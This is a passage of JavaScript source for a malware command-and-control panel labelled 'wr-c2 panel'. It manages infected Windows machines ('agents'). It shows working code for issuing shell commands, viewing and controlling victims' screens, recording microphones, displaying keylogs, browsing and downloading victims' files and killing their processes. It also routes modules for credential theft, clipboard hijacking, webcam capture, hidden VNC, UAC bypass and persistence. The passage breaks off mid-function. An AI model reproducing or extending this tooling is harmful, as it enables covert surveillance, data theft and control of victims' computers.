/* wr-c2 panel */
(() => {
  const $ = (s) => document.querySelector(s);
  const $$ = (s) => [...document.querySelectorAll(s)];

  const S = {
    agents: [], els: new Map(), sel: null, ws: null,
    pending: new Map(), history: [], hIndex: -1,
    view: 'grid', onlineOnly: false, sort: 'host',
    selection: new Set(), treeRoot: null, cwd: '',
    lastDetail: null,
    control: false, downBtn: null, lastMove: 0,
    inPreview: false, sysTimer: null,
    thumbs: {}, screenUrl: null, editing: null,
    groups: [], group: '', secs: new Map(), collapsed: new Set(),
    fileSel: null, procList: [], procFilter: '',
  };

  const ICON = {
    user: '<svg viewBox="0 0 24 24"><circle cx="12" cy="8" r="4"/><path d="M4 21c0-4 4-6 8-6s8 2 8 6"/></svg>',
    shield: '<svg viewBox="0 0 24 24"><path d="M12 3l8 3v6c0 5-3.5 8-8 9-4.5-1-8-4-8-9V6z"/><path d="M9 12l2 2 4-4"/></svg>',
    cpu: '<svg viewBox="0 0 24 24"><rect x="6" y="6" width="12" height="12" rx="2"/><path d="M9 2v3M15 2v3M9 19v3M15 19v3M2 9h3M2 15h3M19 9h3M19 15h3"/></svg>',
    ram: '<svg viewBox="0 0 24 24"><rect x="3" y="7" width="18" height="10" rx="2"/><path d="M7 17v3M12 17v3M17 17v3M7 11h2M11 11h2M15 11h2"/></svg>',
    mouse: '<svg viewBox="0 0 24 24"><rect x="6" y="3" width="12" height="18" rx="6"/><path d="M12 3v7"/></svg>',
    monitor: '<svg viewBox="0 0 24 24"><rect x="3" y="4" width="18" height="12" rx="2"/><path d="M8 20h8M12 16v4"/></svg>',
    term: '<svg viewBox="0 0 24 24"><path d="M5 7l5 5-5 5"/><path d="M13 17h6"/></svg>',
    mic: '<svg viewBox="0 0 24 24"><rect x="9" y="3" width="6" height="11" rx="3"/><path d="M5 11a7 7 0 0 0 14 0"/><path d="M12 18v3"/></svg>',
    power: '<svg viewBox="0 0 24 24"><path d="M12 3v9"/><path d="M6.5 6.5a8 8 0 1 0 11 0"/></svg>',
    star: '<svg viewBox="0 0 24 24"><path d="M12 3l2.8 5.7 6.2.9-4.5 4.4 1 6.2-5.5-3-5.5 3 1-6.2L3 9.6l6.2-.9z"/></svg>',
    dots: '<svg viewBox="0 0 24 24"><circle cx="12" cy="5" r="1"/><circle cx="12" cy="12" r="1"/><circle cx="12" cy="19" r="1"/></svg>',
    folder: '<svg viewBox="0 0 24 24"><path d="M3 7a2 2 0 0 1 2-2h4l2 2h8a2 2 0 0 1 2 2v9a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/></svg>',
    file: '<svg viewBox="0 0 24 24"><path d="M6 3h8l4 4v14H6z"/><path d="M14 3v4h4"/></svg>',
    chev: '<svg viewBox="0 0 24 24"><path d="M9 6l6 6-6 6"/></svg>',
    up: '<svg viewBox="0 0 24 24"><path d="M12 20V5"/><path d="M6 11l6-6 6 6"/></svg>',
    check: '<svg viewBox="0 0 24 24"><path d="M4 12l5 5L20 6"/></svg>',
    close: '<svg viewBox="0 0 24 24"><path d="M6 6l12 12"/><path d="M18 6L6 18"/></svg>',
  };

  // ------------------------------------------------------------------
  async function api(path, opts = {}) {
    const res = await fetch(path, { credentials: 'same-origin', ...opts });
    if (res.status === 401) { location.href = '/login'; throw new Error('auth'); }
    if (res.status === 204) return null;
    if (!res.ok) {
      let msg = res.statusText;
      try { msg = (await res.json()).detail || msg; } catch {}
      throw new Error(msg);
    }
    const ct = res.headers.get('content-type') || '';
    return ct.includes('json') ? res.json() : res.text();
  }

  function esc(s) {
    return String(s ?? '').replace(/[&<>"]/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c]));
  }
  function bytes(n) {
    n = Number(n) || 0;
    if (n < 1024) return n + ' B';
    if (n < 1048576) return (n / 1024).toFixed(1) + ' KB';
    if (n < 1073741824) return (n / 1048576).toFixed(1) + ' MB';
    return (n / 1073741824).toFixed(1) + ' GB';
  }
  function ago(ts) {
    if (!ts) return '—';
    const d = Math.max(0, Date.now() / 1000 - ts);
    if (d < 60) return 'just now';
    if (d < 3600) return Math.floor(d / 60) + 'm ago';
    if (d < 86400) return Math.floor(d / 3600) + 'h ago';
    return Math.floor(d / 86400) + 'd ago';
  }
  function toast(msg) {
    const el = $('#toast');
    el.textContent = msg;
    el.classList.add('show');
    clearTimeout(el._t);
    el._t = setTimeout(() => el.classList.remove('show'), 2200);
  }

  // ------------------------------------------------------------------
  // groups
  // ------------------------------------------------------------------
  const GC = ['#6366f1', '#22c55e', '#f59e0b', '#ec4899', '#06b6d4',
              '#a855f7', '#ef4444', '#84cc16', '#f97316', '#14b8a6'];

  function groupColor(name) {
    const hit = S.groups.find((g) => g.name === name);
    if (hit && hit.color) return hit.color;
    let h = 0;
    for (let i = 0; i < name.length; i++) h = (h * 31 + name.charCodeAt(i)) >>> 0;
    return GC[h % GC.length];
  }

  function groupInfo(name) {
    return S.groups.find((g) => g.name === name) || { name, color: groupColor(name), count: 0, online: 0 };
  }

  function syncGroups(groups) {
    if (!Array.isArray(groups)) return;
    S.groups = groups;
    if (S.group && !groups.some((g) => g.name === S.group)) S.group = '';
    renderGroupBar();
    renderBulkTargets();
    renderGroups();
    render();
  }

  function renderGroupBar() {
    const bar = $('#groupBar');
    if (!bar) return;
    const total = S.agents.length;
    const online = S.agents.filter((a) => a.online).length;
    let html = `<button class="gchip ${S.group ? '' : 'on'}" data-grp="">
        <i style="background:#7b879e"></i><b>all</b><span>${online}/${total}</span></button>`;
    for (const g of S.groups) {
      html += `<button class="gchip ${S.group === g.name ? 'on' : ''}" data-grp="${esc(g.name)}">
        <i style="background:${esc(g.color)}"></i><b>${esc(g.name)}</b>
        <span>${g.online || 0}/${g.count || 0}</span></button>`;
    }
    const ungrouped = S.agents.filter((a) => !a.grp).length;
    if (ungrouped) {
      html += `<button class="gchip ${S.group === '__none' ? 'on' : ''}" data-grp="__none">
        <i style="background:#4b566c"></i><b>ungrouped</b><span>${ungrouped}</span></button>`;
    }
    bar.innerHTML = html;
  }

  function renderBulkTargets() {
    const list = $('#bulkGrpList');
    if (list) list.innerHTML = S.groups.map((g) => `<option value="${esc(g.name)}">`).join('');
  }

  // ------------------------------------------------------------------
  // cards
  // ------------------------------------------------------------------
  function sig(a) {
    return [a.host, a.user, a.id, a.ip, a.os_short, a.arch, a.monitors, a.cpu, a.ram,
            a.admin, a.cc, a.ver, a.nickname, a.grp, a.grp ? groupColor(a.grp) : '',
            a.note, a.pinned].join('|');
  }

  function cardHTML(a) {
    const online = a.online;
    return `
      <div class="thumb">
        ${online ? `<img src="/api/agents/${a.id}/preview.jpg?n=${a.frame}" alt="">` : ''}
        <div class="ghost">${online ? '' : 'offline'}</div>
        <div class="thumb-actions">
          <button data-act="pick" class="${S.selection.has(a.id) ? 'on' : ''}" title="select">${ICON.check}</button>
          <button data-act="pin" class="${a.pinned ? 'on' : ''}" title="pin">${ICON.star}</button>
          <button data-act="menu" title="edit client">${ICON.dots}</button>
        </div>
        <div class="thumb-bar">
          <span class="live ${online ? '' : 'offline'}"><i></i>${online ? 'Online' : 'Offline'}
            <em>·</em> ${online ? 'now' : ago(a.last_seen)}</span>
          <span class="ping ${pingClass(a.ping)}">${ICON.mouse}${fmtPing(a.ping)}</span>
        </div>
      </div>
      <div class="body">
        <div class="row title">
          <span class="flag">${esc(a.cc || '??')}</span>
          <b>${esc(a.nickname || a.host || 'unknown')}</b>
          ${a.grp ? `<span class="badge grp" style="border-color:${esc(groupColor(a.grp))};color:${esc(groupColor(a.grp))}">${esc(a.grp)}</span>` : ''}
          ${a.admin ? '<span class="badge">admin</span>' : ''}
          ${ICON.shield}
        </div>
        <div class="row sub">${ICON.user}${esc(a.user || '—')}${a.nickname && a.host ? ' · ' + esc(a.host) : ''}</div>
        <div class="row ids">
          <span>${esc(a.ip || '—')}</span><span class="dot"></span><span>${esc(a.id.slice(0, 8))}</span>
        </div>
        <div class="row specs">
          <span class="chip-os">${esc(a.os_short || 'WIN')}</span>
          <span class="mono">${esc(a.arch || 'amd64')}</span>
          <span>${ICON.monitor}</span><span class="mono">${a.monitors || 1}</span>
          <span class="mono">v${esc((a.ver || '0').replace(/^v/, ''))}</span>
        </div>
        <div class="row hw">
          <span class="chip cpu">${ICON.cpu}${esc(a.cpu || 'unknown cpu')}</span>
          <span class="chip ram">${ICON.ram}${Math.round(a.ram || 0)} GB</span>
        </div>
        <div class="row actions">
          <button class="primary" data-act="open">${ICON.term}Commands</button>
          <button class="ibtn" data-act="mic" title="record microphone">${ICON.mic}</button>
          <button class="ibtn" data-act="screen" title="live screen">${ICON.monitor}</button>
          <button class="ibtn danger" data-act="kill" title="terminate">${ICON.power}</button>
        </div>
      </div>`;
  }

  function fmtPing(ms) {
    return ms == null ? '—' : Math.max(1, Math.round(ms)) + ' ms';
  }

  function pingClass(ms) {
    if (ms == null) return '';
    if (ms < 60) return 'good';
    if (ms < 160) return 'mid';
    return 'bad';
  }

  function updateCard(a) {
    let el = S.els.get(a.id);
    const s = sig(a);
    if (!el) {
      el = document.createElement('article');
      el.className = 'card';
      el.dataset.id = a.id;
      el.innerHTML = cardHTML(a);
      el._sig = s;
      S.els.set(a.id, el);
    } else if (el._sig !== s) {
      el.innerHTML = cardHTML(a);
      el._sig = s;
    }
    el.classList.toggle('off', !a.online);
    el.classList.toggle('sel', S.selection.has(a.id));
    el.classList.toggle('pinned', !!a.pinned);
    const live = el.querySelector('.live');
    if (live) {
      live.classList.toggle('offline', !a.online);
      live.innerHTML = `<i></i>${a.online ? 'Online' : 'Offline'} <em>·</em> ${a.online ? 'now' : ago(a.last_seen)}`;
    }
    const ping = el.querySelector('.ping');
    if (ping) {
      ping.className = 'ping ' + pingClass(a.ping);
      ping.innerHTML = ICON.mouse + fmtPing(a.ping);
    }
    const pick = el.querySelector('[data-act="pick"]');
    if (pick) pick.classList.toggle('on', S.selection.has(a.id));
  }

  function applyFilter(list) {
    const q = $('#q').value.trim().toLowerCase();
    return list.filter((a) => {
      if (S.onlineOnly && !a.online) return false;
      if (S.group === '__none' && a.grp) return false;
      if (S.group && S.group !== '__none' && a.grp !== S.group) return false;
      if (!q) return true;
      return [a.host, a.user, a.id, a.ip, a.os_short, a.cpu, a.nickname, a.grp, a.note].join(' ').toLowerCase().includes(q);
    });
  }

  function sortList(list) {
    const key = S.sort;
    return [...list].sort((a, b) => {
      if (!!b.pinned !== !!a.pinned) return (b.pinned ? 1 : 0) - (a.pinned ? 1 : 0);
      if (key === 'online') return (b.online - a.online) || (a.host || '').localeCompare(b.host || '');
      if (key === 'ping') return (a.ping ?? 9999) - (b.ping ?? 9999);
      return (a.host || '').localeCompare(b.host || '');
    });
  }

  function render() {
    const visible = sortList(applyFilter(S.agents));
    const seen = new Set();
    for (const a of visible) { updateCard(a); seen.add(a.id); }

    for (const [id, el] of S.els) {
      if (!seen.has(id)) { el.remove(); S.els.delete(id); }
    }

    const board = $('#board');
    const buckets = new Map();
    for (const a of visible) {
      const key = a.grp || '__none';
      if (!buckets.has(key)) buckets.set(key, []);
      buckets.get(key).push(a);
    }

    const keys = [...buckets.keys()].sort((x, y) => {
      if (x === '__none') return 1;
      if (y === '__none') return -1;
      return x.localeCompare(y);
    });

    const live = new Set(keys);
    for (const [key, sec] of S.secs) {
      if (!live.has(key)) { sec.remove(); S.secs.delete(key); }
    }

    for (const key of keys) {
      let sec = S.secs.get(key);
      if (!sec) {
        sec = document.createElement('section');
        sec.className = 'gsec';
        sec.dataset.grp = key;
        sec.innerHTML = `<header class="ghead"><i></i><b></b><span class="gcount"></span><span class="gchev">${ICON.chev}</span></header><div class="grid"></div>`;
        S.secs.set(key, sec);
      }
      sec.classList.toggle('collapsed', S.collapsed.has(key));
      const name = key === '__none' ? 'ungrouped' : key;
      const info = key === '__none' ? { color: '#4b566c' } : groupInfo(key);
      const members = buckets.get(key);
      sec.querySelector('.ghead i').style.background = info.color || '#4b566c';
      sec.querySelector('.ghead b').textContent = name;
      sec.querySelector('.gcount').textContent =
        `${members.filter((a) => a.online).length}/${members.length}`;
      board.appendChild(sec);
      const grid = sec.querySelector('.grid');
      for (const a of members) grid.appendChild(S.els.get(a.id));
    }

    $('#empty').classList.toggle('hidden', S.agents.length > 0);
    renderBulkState();
  }

  function renderBulkState() {
    const n = S.selection.size;
    const bar = $('#bulkBar');
    if (bar) bar.classList.toggle('hidden', n === 0);
    const count = $('#bulkCount');
    if (count) count.textContent = n + ' selected';
  }

  async function loadState() {
    try {
      const data = await api('/api/state');
      S.agents = data.agents;
      if (data.groups) S.groups = data.groups;
      renderGroupBar();
      renderBulkTargets();
      renderGroups();
      render();
    } catch {}
  }

  async function patchMeta(id, fields) {
    try {
      const r = await api(`/api/agents/${encodeURIComponent(id)}/meta`, {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(fields),
      });
      if (r && r.agent) {
        const i = S.agents.findIndex((x) => x.id === id);
        if (i >= 0) S.agents[i] = { ...S.agents[i], ...r.agent };
        render();
      }
      return r;
    } catch (e) { toast(e.message); return null; }
  }

  // ------------------------------------------------------------------
  // modal
  // ------------------------------------------------------------------
  function agentById(id) { return S.agents.find((a) => a.id === id); }

  async function openAgent(id) {
    const a = agentById(id);
    if (!a) return;
    S.sel = id;
    $('#modal').classList.remove('hidden');
    $('#mHost').textContent = a.nickname || a.host || 'unknown';
    $('#mMeta').textContent = [a.grp, a.user, a.os, a.ip, a.id.slice(0, 8)].filter(Boolean).join('  ·  ');
    $('#mPing').textContent = fmtPing(a.ping);
    fillMonitors(a.monitors);
    $('#term').innerHTML = '';
    $('#keyOut').textContent = '';
    $('#sysOut').textContent = '';
    $('#spyOut').textContent = '';
    $('#toolOut').textContent = '';
    $('#audioWrap').innerHTML = '';
    $('#screenImg').removeAttribute('src');
    $('#screenEmpty').classList.remove('hidden');
    $('#procList').innerHTML = '';
    $('#procHint').textContent = '—';
    S.fileSel = null;
    S.procList = [];
    S.procFilter = '';
    setControl(false, true);

    term(`session ${a.host} · ${a.online ? 'live' : 'offline'}`, 'sys');

    try {
      const d = await api('/api/agents/' + encodeURIComponent(id));
      S.lastDetail = d;
      renderStats(d.agent);
      renderTransfers(d.files || []);
      renderKeylog(d.keylogs || []);
      for (const c of [...d.commands].reverse()) {
        if (c.status !== 'done' || !c.body) continue;
        try { renderBody(JSON.parse(c.body), c.module, true); } catch {}
      }
    } catch (e) { term(e.message, 'err'); }

    switchPane('console');
    loadDrives();
  }

  function closeModal() {
    leavePreview();
    stopSysPoll();
    setControl(false, true);
    $('#modal').classList.add('hidden');
    S.sel = null;
  }

  function switchPane(name) {
    $$('.rtab').forEach((t) => t.classList.toggle('active', t.dataset.pane === name));
    $$('.pane').forEach((p) => p.classList.toggle('active', p.id === 'pane-' + name));
    if (name === 'screen') { showScreen(); enterPreview(); }
    else leavePreview();
    if (name === 'system') { startSysPoll(); loadProcs(); }
    else stopSysPoll();
  }

  function showScreen() {
    if (!S.sel) return;
    const a = agentById(S.sel);
    const img = $('#screenImg');
    if (S.screenUrl) { URL.revokeObjectURL(S.screenUrl); S.screenUrl = null; }
    if (a && a.has_preview) {
      img.src = `/api/agents/${S.sel}/preview.jpg?n=${a.frame || 0}`;
      $('#screenEmpty').classList.add('hidden');
    }
  }

  function previewOpts() {
    return {
      action: 'set',
      fps: +$('#pvFps').value || 15,
      width: +$('#pvWidth').value || 1280,
      quality: +$('#pvQuality').value || 60,
      monitor: +$('#pvMonitor').value,
      paused: false,
    };
  }

  function fillMonitors(count) {
    const sel = $('#pvMonitor');
    if (!sel) return;
    const cur = sel.value;
    let html = '<option value="-1">all</option>';
    for (let i = 0; i < Math.max(1, count | 0); i++) html += `<option value="${i}">${i + 1}</option>`;
    sel.innerHTML = html;
    sel.value = [...sel.options].some((o) => o.value === cur) ? cur : '-1';
  }

  function enterPreview() {
    if (S.inPreview || !S.sel) return;
    S.inPreview = true;
    sendSilent('preview', previewOpts());
  }

  function leavePreview() {
    if (!S.inPreview) return;
    S.inPreview = false;
    setControl(false, true);
    sendSilent('preview', { action: 'set', interval_ms: 4000, width: 640, quality: 45, paused: false });
  }

  function setControl(on, quiet) {
    S.control = on;
    const btn = $('#ctlToggle');
    if (btn) {
      btn.textContent = on ? 'control on' : 'control off';
      btn.classList.toggle('accent', on);
    }
    $('#screenWrap')?.classList.toggle('ctl', on);
    $('#ctlHint')?.classList.toggle('hidden', on);
    $('#ctlDot')?.classList.toggle('hidden', !on);
    if (on) $('#screenWrap')?.focus();
    if (!quiet && S.sel) {
      const opts = previewOpts();
      if (on) { opts.fps = 30; opts.quality = Math.max(opts.quality, 75); }
      sendSilent('preview', opts);
    }
    if (!on) S.downBtn = null;
  }

  function term(text, cls = 'out') {
    const box = $('#term');
    if (!box) return;
    const atBottom = box.scrollTop + box.clientHeight >= box.scrollHeight - 40;
    const div = document.createElement('div');
    div.className = 'ln ' + cls;
    div.textContent = text;
    box.appendChild(div);
    if (atBottom) box.scrollTop = box.scrollHeight;
    while (box.childElementCount > 2500) box.removeChild(box.firstChild);
  }

  function toolOut(module) {
    if (['creds', 'clipper', 'webcam'].includes(module)) return $('#spyOut');
    if (['netscan', 'socks', 'hosts', 'hvnc', 'flip', 'shellui', 'cdtray',
         'openurl', 'shred', 'uac', 'update', 'persist', 'inputlock',
         'overlay', 'env', 'wallpaper', 'wol', 'wifi', 'services', 'software',
         'startup', 'registry', 'tasks', 'net', 'search', 'kill',
         'drives'].includes(module)) return $('#toolOut');
    return null;
  }

  function renderBody(body, module) {
    if (!body) return;
    if (body.stdout) term(body.stdout.replace(/\s+$/, ''), 'out');
    if (body.stderr) term(body.stderr.replace(/\s+$/, ''), 'err');
    if (body.error) term(body.error, 'err');
    if (module === 'sysinfo') renderStats(null, body.meta);

    const box = toolOut(module);
    if (box) {
      const text = [body.stdout, body.stderr, body.error]
        .filter(Boolean).join('\n').replace(/\s+$/, '');
      if (text) box.textContent = text;
    }
  }

  function renderStats(agent, meta) {
    const box = $('#sysOut');
    if (!box) return;
    if (agent) {
      const rows = [
        ['host', agent.host], ['user', agent.user], ['ip', agent.ip],
        ['os', agent.os], ['arch', agent.arch], ['cpu', agent.cpu],
        ['ram', (Math.round(agent.ram) || 0) + ' GB'], ['gpu', agent.gpu],
        ['monitors', agent.monitors], ['admin', agent.admin ? 'yes' : 'no'],
      ];
      box.textContent = rows.map(([k, v]) => k.padEnd(10) + (v ?? '—')).join('\n');
    } else if (meta) {
      const flat = Object.entries(meta).filter(([, v]) => typeof v !== 'object' || v === null);
      box.textContent = flat.map(([k, v]) => String(k).padEnd(10) + v).join('\n');
    }
  }

  // ------------------------------------------------------------------
  // live system dashboard
  // ------------------------------------------------------------------
  function startSysPoll() {
    stopSysPoll();
    if (!S.sel) return;
    refreshSys();
    S.sysTimer = setInterval(refreshSys, 4000);
  }

  function stopSysPoll() {
    if (S.sysTimer) { clearInterval(S.sysTimer); S.sysTimer = null; }
  }

  function refreshSys() {
    if (!S.sel) return;
    const a = agentById(S.sel);
    if (!a || !a.online) return;
    sendSilent('sysstat', {});
  }

  function barClass(pct) {
    return pct >= 85 ? 'hot' : pct >= 60 ? 'mid' : '';
  }

  function uptimeText(sec) {
    sec = Math.max(0, +sec || 0);
    const d = Math.floor(sec / 86400);
    const h = Math.floor((sec % 86400) / 3600);
    const m = Math.floor((sec % 3600) / 60);
    return d > 0 ? `${d}d ${h}h` : h > 0 ? `${h}h ${m}m` : `${m}m`;
  }

  function rate(bps) {
    if (bps >= 1048576) return (bps / 1048576).toFixed(1) + ' MB/s';
    if (bps >= 1024) return Math.round(bps / 1024) + ' KB/s';
    return Math.round(bps) + ' B/s';
  }

  function renderSysStat(meta) {
    if (!meta) return;
    const cpu = +meta.cpu || 0;
    const memPct = +meta.mem_pct || 0;

    $('#stCpu').textContent = cpu.toFixed(1) + '% · ' + (meta.cores || 0) + ' cores';
    const cb = $('#stCpuBar');
    cb.style.width = Math.min(100, cpu) + '%';
    cb.className = barClass(cpu);

    $('#stRam').textContent = `${bytes(meta.mem_used)} / ${bytes(meta.mem_total)}`;
    const rb = $('#stRamBar');
    rb.style.width = Math.min(100, memPct) + '%';
    rb.className = barClass(memPct);

    $('#stUp').textContent = uptimeText(meta.uptime_sec);

    const rx = +meta.net_rx || 0, tx = +meta.net_tx || 0;
    $('#stNet').innerHTML = rx || tx
      ? `<span>${rate(rx)} in</span><span class="ul">${rate(tx)} out</span>`
      : '<span>idle</span>';

    const bat = meta.battery || {};
    $('#stPower').textContent = bat.present
      ? `${bat.pct}% ${bat.ac ? '· ac' : '· battery'}`
      : 'ac power';

    const disks = meta.disks || [];
    $('#sysDisks').innerHTML = disks.map((d) => `
      <div class="diskrow">
        <div class="top"><b>${esc(d.name)}</b><span>${esc(d.label || '')}</span>
          <span class="sz">${(+d.pct).toFixed(0)}% · ${bytes(d.free)} free / ${bytes(d.total)}</span></div>
        <div class="bar"><i class="${barClass(d.pct)}" style="width:${Math.min(100, d.pct)}%"></i></div>
      </div>`).join('') || '<div class="diskrow"><span class="sz">no fixed drives</span></div>';

    const hint = $('#sysProcHint');
    if (hint) hint.textContent = `${meta.procs || 0} running · click to kill`;

    const procs = meta.top || [];
    $('#sysProcs').innerHTML = procs.map((p) => `
      <div class="procrow" data-pid="${p.pid}" data-name="${esc(p.name)}">
        <span class="nm">${esc(p.name)}</span>
        <span class="pid">${p.pid}</span>
        <span class="cpu">${(+p.cpu).toFixed(1)}%</span>
        <span class="ram">${bytes(p.ws)}</span>
        <span class="kill">kill</span>
      </div>`).join('') || '<div class="procrow"><span class="nm">idle</span></div>';
  }

  function renderProcList() {
    const box = $('#procList');
    if (!box) return;
    const q = S.procFilter.toLowerCase();
    const list = S.procList.filter((p) =>
      !q || `${p.name || ''} ${p.pid || ''} ${p.path || ''}`.toLowerCase().includes(q));
    const hint = $('#procHint');
    if (hint) hint.textContent = `${S.procList.length} total` + (q ? ` · ${list.length} match` : '');
    box.innerHTML = list.slice(0, 900).map((p) => `
      <div class="procrow" data-pid="${p.pid}" data-name="${esc(p.name)}">
        <span class="nm">${esc(p.name)}</span>
        <span class="pid">${p.pid}</span>
        <span class="ram">${bytes(p.ws)}</span>
        <span class="pth" title="${esc(p.path || '')}">${esc(p.path || '')}</span>
        <span class="kill">kill</span>
      </div>`).join('') || '<div class="procrow"><span class="nm">no match</span></div>';
  }

  function loadProcs() {
    if (!S.sel) return;
    const a = agentById(S.sel);
    if (!a || !a.online) return;
    sendSilent('ps', {});
  }

  function wireSysProcs() {
    $('#sysProcs').addEventListener('click', (e) => {
      const row = e.target.closest('.procrow');
      if (!row || !row.dataset.pid) return;
      const pid = +row.dataset.pid;
      const name = row.dataset.name || String(pid);
      if (!confirm(`kill ${name} (pid ${pid})?`)) return;
      run('kill', { pid }, `kill ${name} (${pid})`);
    });

    const list = $('#procList');
    if (list) {
      list.addEventListener('click', (e) => {
        const row = e.target.closest('.procrow');
        if (!row || !row.dataset.pid) return;
        const pid = +row.dataset.pid;
        const name = row.dataset.name || String(pid);
        if (!confirm(`kill ${name} (pid ${pid})?`)) return;
        run('kill', { pid }, `kill ${name} (${pid})`);
      });
    }

    $('#procRefresh')?.addEventListener('click', loadProcs);
    $('#procSearch')?.addEventListener('input', (e) => {
      S.procFilter = e.target.value.trim();
      renderProcList();
    });
  }

  // ------------------------------------------------------------------
  // commands
  // ------------------------------------------------------------------
  async function run(module, args = {}, label = null) {
    if (!S.sel) return;
    try {
      const { id } = await api(`/api/agents/${encodeURIComponent(S.sel)}/cmd`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ module, args }),
      });
      S.pending.set(id, { module, label });
      if (label) term(label, 'cmd');
      else if (module === 'shell') term(args.cmd || '', 'cmd');
    } catch (e) { term(e.message, 'err'); }
  }

  async function sendSilent(module, args = {}) {
    if (!S.sel) return null;
    try {
      return await api(`/api/agents/${encodeURIComponent(S.sel)}/cmd`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ module, args, silent: true }),
      });
    } catch { return null; }
  }

  // latency-critical input rides the panel websocket (no HTTP round trip)
  function sendCtl(module, args = {}) {
    if (!S.sel) return false;
    const ws = S.ws;
    if (ws && ws.readyState === WebSocket.OPEN) {
      ws.send(JSON.stringify({ t: 'ctl', agent_id: S.sel, module, args }));
      return true;
    }
    sendSilent(module, args);
    return false;
  }

  // ------------------------------------------------------------------
  // files
  // ------------------------------------------------------------------
  function targetDir() {
    const typed = ($('#fPath').value || '').trim();
    if (typed) return typed.replace(/[\\/]+$/, '');
    return (S.cwd || '').replace(/[\\/]+$/, '');
  }

  function joinPath(dir, name) {
    if (!dir) return name;
    const sep = dir.includes('/') && !dir.includes('\\') ? '/' : '\\';
    return dir.replace(/[\\/]+$/, '') + sep + name;
  }

  function parentPath(p) {
    if (!p) return '';
    const norm = p.replace(/[\\/]+$/, '');
    if (/^[a-zA-Z]:$/.test(norm)) return '';
    const idx = Math.max(norm.lastIndexOf('\\'), norm.lastIndexOf('/'));
    if (idx < 0) return '';
    const parent = norm.slice(0, idx);
    return /^[a-zA-Z]:$/.test(parent) ? parent + '\\' : parent;
  }

  function setCwd(p) {
    S.cwd = p || '';
    const path = $('#fPath');
    if (path) path.value = S.cwd;
  }

  function selectFile(entry, row) {
    S.fileSel = entry;
    $$('#ftree .node.sel').forEach((n) => n.classList.remove('sel'));
    if (row) row.classList.add('sel');
    const hint = $('#fHint');
    if (hint) hint.textContent = entry ? `selected ${entry.name}` : 'double-click a file to download · click to select';
  }

  async function loadDrives() {
    const tree = $('#ftree');
    setCwd('');
    selectFile(null, null);
    tree.innerHTML = '<div class="node"><span class="nm">loading drives…</span></div>';
    try {
      const r = await api(`/api/agents/${encodeURIComponent(S.sel)}/cmd`, {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ module: 'drives', args: {} }),
      });
      S.pending.set(r.id, { module: 'drives' });
    } catch (e) { tree.innerHTML = `<div class="node"><span class="nm">${esc(e.message)}</span></div>`; }
  }

  function renderDrives(drives) {
    const tree = $('#ftree');
    tree.innerHTML = '';
    if (!drives || !drives.length) {
      tree.innerHTML = '<div class="node"><span class="nm">no drives reported</span></div>';
      return;
    }
    for (const d of drives) {
      const node = makeNode({ name: d.name, path: d.name, dir: true, free: d.free, total: d.total }, true);
      tree.appendChild(node);
    }
  }

  function openListing(path) {
    if (!S.sel) return;
    setCwd(path);
    selectFile(null, null);
    const box = $('#ftree');
    box.innerHTML = '<div class="node"><span class="nm">loading…</span></div>';
    api(`/api/agents/${encodeURIComponent(S.sel)}/cmd`, {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ module: 'ls', args: { path } }),
    }).then((r) => S.pending.set(r.id, { module: 'ls', target: box }))
      .catch((e) => { box.innerHTML = `<div class="node"><span class="nm">${esc(e.message)}</span></div>`; });
  }

  function makeNode(entry, isRoot = false) {
    const wrap = document.createElement('div');
    const row = document.createElement('div');
    row.className = 'node' + (entry.dir ? ' dir' : '');
    const size = entry.dir
      ? (entry.total ? `${bytes(entry.free)} free` : '')
      : bytes(entry.size);
    row.innerHTML = `
      <span class="ic${entry.dir ? ' chev' : ''}">${entry.dir ? ICON.chev : ICON.file}</span>
      <span class="nm">${esc(entry.name)}</span>
      <span class="sz">${size}</span>
      <span class="dt">${entry.mtime ? new Date(entry.mtime).toLocaleDateString() : ''}</span>
      <span class="go">${entry.dir ? '' : '↓'}</span>`;
    wrap.appendChild(row);

    if (entry.dir) {
      const kids = document.createElement('div');
      kids.className = 'kids hidden';
      wrap.appendChild(kids);

      row.addEventListener('click', async (ev) => {
        ev.stopPropagation();
        setCwd(entry.path);
        selectFile(null, null);
        if (row.dataset.loaded === '1') {
          kids.classList.toggle('hidden');
          row.classList.toggle('open');
          return;
        }
        if (!S.sel) return;
        row.dataset.loaded = '1';
        row.classList.add('open');
        kids.classList.remove('hidden');
        kids.innerHTML = '<div class="node"><span class="nm">…</span></div>';

        try {
          const r = await api(`/api/agents/${encodeURIComponent(S.sel)}/cmd`, {
            method: 'POST', headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ module: 'ls', args: { path: entry.path } }),
          });
          S.pending.set(r.id, { module: 'ls', target: kids });
        } catch (e) {
          kids.innerHTML = `<div class="node"><span class="nm">${esc(e.message)}</span></div>`;
        }
      });
    } else {
      row.addEventListener('click', (ev) => {
        ev.stopPropagation();
        selectFile(entry, row);
        const parent = parentPath(entry.path);
        if (parent) {
          const p = $('#fPath');
          if (p && (!p.value || !entry.path.startsWith(p.value))) p.value = parent;
        }
      });
      row.addEventListener('dblclick', (ev) => {
        ev.stopPropagation();
        term(`download ${entry.path}`, 'cmd');
        run('download', { path: entry.path });
      });
      row.querySelector('.go')?.addEventListener('click', (ev) => {
        ev.stopPropagation();
        term(`download ${entry.path}`, 'cmd');
        run('download', { path: entry.path });
      });
    }

    return wrap;
  }

  function renderListing(container, entries) {
    container.innerHTML = '';
    if (!entries || !entries.length) {
      container.innerHTML = '<div class="node"><span class="nm">empty</span></div>';
      return;
    }
    const dirs = entries.filter((e) => e.dir).sort((a, b) => a.name.localeCompare(b.name));
    const files = entries.filter((e) => !e.dir).sort((a, b) => a.name.localeCompare(b.name));
    for (const e of [...dirs, ...files]) container.appendChild(makeNode(e));
  }

  // file operations ---------------------------------------------------
  function promptName(title, value = '') {
    const v = prompt(title, value);
    return v == null ? null : v.trim();
  }

  async function fileOp(module, args, label) {
    if (!S.sel) return;
    try {
      const { id } = await api(`/api/agents/${encodeURIComponent(S.sel)}/cmd`, {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ module, args }),
      });
